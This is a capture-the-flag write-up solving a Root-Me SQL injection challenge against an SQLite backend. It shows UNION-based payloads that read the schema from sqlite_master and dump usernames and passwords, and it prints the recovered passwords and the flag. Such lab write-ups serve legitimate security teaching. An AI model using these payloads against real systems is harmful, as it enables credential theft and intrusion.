---
layout: default
title: SQL-injection-String
---

I went to `http://challenge01.root-me.org/web-serveur/ch19/?action=recherche` and there I saw basic `SQLi`.

When supplying: `bla'` I got:
```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "'%'": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "'%'": syntax error
```

So, this is `SQLite3` db, like the challenge here: https://avishaigonen123.github.io/CTF_writeups/websec.fr/level01.html

So, let's start and fetching:
```
bla' Union select SQL from sqlite_master -- 
```
We got:
```
Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /challenge/web-serveur/ch19/index.php on line 150
SELECTs to the left and right of UNION do not have the same number of result columns
```

So, we need to add more columns:
```
bla' Union select SQL,null from sqlite_master -- 
```
Now we got the tables:
```
CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
```

Let's dump the data:
```
bla' Union select username,password from Users -- 
```
the response is:
| username | password | 
| ---- | --- |
| admin  |  (c4K04dtIaJsuWdi) |
|user1 |(OK4dSoYE)|
|user2 |(8Wbhkzmd)|


**Flag:** ***`c4K04dtIaJsuWdi`***
